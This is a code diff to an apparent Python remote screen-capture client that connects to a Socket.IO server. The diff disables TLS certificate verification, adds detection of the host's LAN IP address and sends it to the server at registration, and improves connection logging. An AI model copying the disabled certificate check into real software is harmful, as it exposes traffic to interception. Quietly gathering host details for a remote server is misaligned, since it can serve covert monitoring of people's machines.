@@ -16,6 +16,7 @@ import ctypes
 import shutil
 import string
 import tempfile
+import socket
 from typing import Any, Dict, List, Optional, Tuple, Union
 
 from PIL import ImageGrab, Image
@@ -81,7 +82,7 @@ unique_user: str = f"{raw_user}-{unique_id}-{os_suffix}"
 
 # ── SocketIO Client Initialization & State ───────────────────────────────────
 
-sio = socketio.Client(reconnection=True, reconnection_delay=2, reconnection_delay_max=10)
+sio = socketio.Client(ssl_verify=False, reconnection=True, reconnection_delay=2, reconnection_delay_max=10)
 
 capture_active: bool = False
 capture_thread: Optional[threading.Thread] = None
@@ -178,6 +179,16 @@ def capture_loop() -> None:
         time.sleep(1)
 
 
+def get_lan_ip() -> str:
+    """Detect private local IP address of the machine."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return ""
+
+
 # ── SocketIO Core Lifecycle Events ───────────────────────────────────────────
 
 @sio.event
@@ -185,13 +196,15 @@ def connect() -> None:
     """
     Handle connection established event. Automatically registers client metadata with server.
     """
-    print(f"Connected to WebSocket server as {unique_user} (version: {CLIENT_VERSION})")
+    lan_ip = get_lan_ip()
+    print(f"Connected to WebSocket server as {unique_user} (version: {CLIENT_VERSION}, LAN: {lan_ip or 'unknown'})")
     sio.emit(
         "register",
         {
             "username": unique_user,
             "auth_token": CLIENT_KEY,
             "version": CLIENT_VERSION,
+            "lan_ip": lan_ip,
         },
     )
 
@@ -1077,6 +1090,7 @@ def main() -> None:
         for target_url in urls_to_try:
             try:
                 if not sio.connected:
+                    print(f"[*] Connecting to server at {target_url}...")
                     sio.connect(
                         target_url,
                         wait_timeout=10,
@@ -1084,8 +1098,8 @@ def main() -> None:
                         auth={"token": CLIENT_KEY},
                     )
                     sio.wait()
-            except Exception:
-                pass
+            except Exception as e:
+                print(f"[!] Connection failed for {target_url}: {e}")
             if sio.connected:
                 break
         time.sleep(5)
